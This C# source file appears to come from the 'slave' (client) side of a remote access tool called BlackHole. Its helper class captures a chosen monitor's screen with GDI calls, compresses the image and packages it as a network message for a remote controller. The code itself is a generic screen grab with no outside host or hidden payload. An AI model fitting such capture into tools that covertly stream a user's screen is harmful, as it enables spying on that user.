using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Windows.Forms;
using BlackHole.Common.Helpers;
using BlackHole.Common.Network.Protocol;
using BlackHole.Slave.Helper.Native.Impl;

namespace BlackHole.Slave.Helper
{
    /// <summary>
    /// 
    /// </summary>
    public static class RemoteDesktopHelper
    {
        /// <summary>
        /// 
        /// </summary>
        /// <param name="screenNb"></param>
        /// <param name="quality"></param>
        /// <returns></returns>
        public static ScreenCaptureMessage CaptureScreen(int screenNb, int quality)
        {
            var bounds = Screen.AllScreens[screenNb].Bounds;
            var screen = new Bitmap(
                bounds.Width, 
                bounds.Height, 
                PixelFormat.Format32bppPArgb);

            using (var dest = Graphics.FromImage(screen))
            {
                var destPtr = dest.GetHdc();
                var srcPtr = Gdi32.CreateDC("DISPLAY", 
                    null, 
                    null, 
                    IntPtr.Zero);

                Gdi32.BitBlt(destPtr, 
                    0, 
                    0, 
                    bounds.Width, 
                    bounds.Height, 
                    srcPtr, 
                    bounds.X,
                    bounds.Y,
                    Gdi32.ROP_COPY);

                Gdi32.DeleteDC(srcPtr);
                dest.ReleaseHdc(destPtr);
            }

            var compressed = ImageHelpers.CompressImage(screen, quality);
            screen.Dispose();

            return new ScreenCaptureMessage
            {
                ScreenNumber = screenNb,
                Quality = quality,
                Width = bounds.Width,
                Height = bounds.Height,
                RawImage = compressed
            };
        }
    }
}
